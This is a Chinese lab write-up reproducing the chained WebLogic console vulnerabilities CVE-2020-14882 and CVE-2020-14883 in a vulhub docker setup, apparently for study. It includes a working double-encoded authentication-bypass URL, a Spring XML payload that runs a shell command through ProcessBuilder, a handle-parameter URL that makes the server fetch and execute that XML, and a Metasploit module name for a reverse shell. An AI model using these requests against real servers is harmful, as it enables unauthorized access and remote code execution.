ailx10说：这篇是2024年9月之前写的，后来又改过。这篇我把 WebLogic 控制台的两个漏洞接起来试：先解决能不能进到原本受保护的入口，再看 handle 参数能否触发后面的执行。手工用文件标记确认过，又换工具做连接，把两条路线都留在了笔记里。过程中响应和实际动作并不总是同步好懂，单凭一个 404 就判断失败很容易看漏。最想记住的是两个编号各负责哪一段，而不是把它们合成一个万能字符串；绕过访问控制和获得执行能力，毕竟是不同的边界。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883） 环境搭建成功了

![](/notes-assets/65f6f21dcf167dd721bf.webp)

（1）未授权访问，连续访问2次，第一次404，第二次就可以未授权访问了

```
http://144.34.162.13:7001/console/css/%252e%252e%252fconsole.portal
```

![](/notes-assets/db69328ecad297970034.webp)

（2）将POC载荷放到Web服务器上，命名为`rce.xml`

```
<?xml version="1.0" encoding="UTF-8" ?>

<beans xmlns="http://www.springframework.org/schema/beans"

   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">

        <constructor-arg>

          <list>

            <value>bash</value>

            <value>-c</value>

            <value><![CDATA[touch /tmp/ailx10]]></value>

          </list>

        </constructor-arg>

    </bean>

</beans>
```

（3）访问下面的ULR，触发漏洞，虽然响应是404，但是利用成功了

```
http://144.34.162.13:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://144.34.162.13/rce.xml%22)
```

![](/notes-assets/bcd55d60ea2826bab26e.webp)

（4）进入docker，查看文件创建成功

![](/notes-assets/86ab351a63c0ffe75490.webp)

（5）使用metasploit 直接反弹shell

```
multi/http/weblogic_admin_handle_rce
```

![](/notes-assets/4909da9d47eb3db36deb.webp)

![](/notes-assets/0e4b835bf842b13094be.webp)

远程配置文件、初始化方法和进程启动接上以后，链路才完整。把控制台入口的条件也带在旁边，避免一段成功请求让前半段的权限问题悄悄消失。
